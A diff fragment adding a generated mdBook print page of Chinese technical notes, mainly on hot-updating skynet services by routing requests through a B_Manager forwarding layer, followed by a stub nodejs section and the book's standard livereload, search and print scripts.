+<li>这个时候如果B1的业务有大量需要修改的。只需要clearcache一下，让后创建一个新的B1服务，这里称为B2,B_Manager再将A1的请求转发到B2即可，这个时候的消息流为:</li>
+</ul>
+<pre><code>A1 ---&gt; B_Manager ---&gt; B2
+</code></pre>
+<ul>
+<li>
+<p>这个时候B1就不会接收到新的消息了。介意B1的存在可以销毁它，如果资源占用不大，也可以不销毁。</p>
+</li>
+<li>
+<p>当然这里有几个必须要注意的问题:</p>
+<ul>
+<li>如果B1服务是有状态的，那么这个方法是有很大限制的，需要把B1服务的数据通过消息或共享内存，缓存等方式转移到B2服务上。</li>
+<li>如果B1服务上有定时器等可能会影响业务的逻辑时时，必须要关闭定时器或销毁B2服务。</li>
+<li>如果B1是无状态的那就简单多了，创建新的服务B2后，B_mananger将所有需要转发给B1的请求全都转发给B2即可。</li>
+<li>消息中间多了一层B_Manager会不会损失性能，这个需要视业务要求来具体分析，大部分情况，这点新能损失都可以忽略不计的；当然如果你很介意的话，还是建议业务刚上线时使用B_Manager，业务稳定后，可以在某次更新时将这层转发层去掉。</li>
+</ul>
+</li>
+<li>
+<p>上面的方法也是一种折中的方法，个人感觉还是比较好用的，但也是不完美的。</p>
+</li>
+<li>
+<p>关于skynet的热更新，如果你有什么更好的方案，希望能够指点一二！</p>
+</li>
+<li>
+<p>个人的一点想法，分享给大家！如果你也在使用skynet，关注我，一起学习，交流一下！</p>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="tars"><a class="header" href="#tars">tars</a></h1>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="nodejs"><a class="header" href="#nodejs">nodejs</a></h1>
+<h2 id="常用命令-2"><a class="header" href="#常用命令-2">常用命令</a></h2>
+<pre><code>npm list
+</code></pre>
+<h2 id="packagejson"><a class="header" href="#packagejson">package.json</a></h2>
+<ul>
+<li><a href="http://nodejs.cn/learn/the-package-json-guide">package.json规范</a></li>
+</ul>
+<h2 id="参考资料"><a class="header" href="#参考资料">参考资料</a></h2>
+<ul>
+<li><a href="http://nodejs.cn/">nodejs cn</a></li>
+</ul>
+
+                    </main>
+
+                    <nav class="nav-wrapper" aria-label="Page navigation">
+                        <!-- Mobile navigation buttons -->
+
+
+                        <div style="clear: both"></div>
+                    </nav>
+                </div>
+            </div>
+
+            <nav class="nav-wide-wrapper" aria-label="Page navigation">
+
+            </nav>
+
+        </div>
+
+        <!-- Livereload script (if served using the cli tool) -->
+        <script>
+            const wsProtocol = location.protocol === 'https:' ? 'wss:' : 'ws:';
+            const wsAddress = wsProtocol + "//" + location.host + "/" + "__livereload";
+            const socket = new WebSocket(wsAddress);
+            socket.onmessage = function (event) {
+                if (event.data === "reload") {
+                    socket.close();
+                    location.reload();
+                }
+            };
+
+            window.onbeforeunload = function() {
+                socket.close();
+            }
+        </script>
+
+
+
+        <script>
+            window.playground_copyable = true;
+        </script>
+
+
+        <script src="elasticlunr.min.js"></script>
+        <script src="mark.min.js"></script>
+        <script src="searcher.js"></script>
+
+        <script src="clipboard.min.js"></script>
+        <script src="highlight.js"></script>
+        <script src="book.js"></script>
+
+        <!-- Custom JS scripts -->
+
+        <script>
+        window.addEventListener('load', function() {
+            window.setTimeout(window.print, 100);
+        });
+        </script>
+
+    </div>
+    </body>
+</html>
